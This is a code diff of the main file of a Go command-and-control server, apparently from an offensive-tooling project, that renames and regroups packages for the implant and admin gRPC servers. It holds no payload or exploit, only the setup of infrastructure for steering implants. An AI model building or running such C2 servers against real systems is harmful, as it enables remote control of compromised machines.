@@ -1,8 +1,10 @@
 package main
 
 import (
-	"blackhatgo/c2c/grpcapi"
+	"blackhatgo/c2c/api"
+	"blackhatgo/c2c/auth"
 	"blackhatgo/c2c/server"
+	"blackhatgo/c2c/storage"
 	"database/sql"
 	"fmt"
 	"log"
@@ -51,7 +53,7 @@ func main() {
 		log.Fatalln(err)
 	}
 	defer db.Close()
-	err = server.CreateTables(db)
+	err = storage.CreateTables(db)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -62,13 +64,13 @@ func main() {
 	}
 	implantOpts := append(opts, grpc.Creds(implantCreds))
 
-	clientCreds, err := server.LoadTLSServerCreds()
+	clientCreds, err := auth.LoadTLSServerCreds()
 	if err != nil {
 		log.Fatalln(err)
 	}
 	clientOpts := append(opts, grpc.Creds(clientCreds))
 
-	work, results := make(map[string]chan *grpcapi.Command), make(map[string]chan *grpcapi.Command)
+	work, results := make(map[string]chan *api.Command), make(map[string]chan *api.Command)
 	sessions := server.NewSessionManager(work, results)
 	implants := make(map[uuid.UUID]time.Time)
 	implant := server.NewImplantServer(sessions, implants, db)
@@ -82,8 +84,8 @@ func main() {
 	}
 
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(clientOpts...), grpc.NewServer(implantOpts...)
-	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
-	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+	api.RegisterImplantServer(grpcImplantServer, implant)
+	api.RegisterAdminServer(grpcAdminServer, admin)
 
 	printBanner()
 
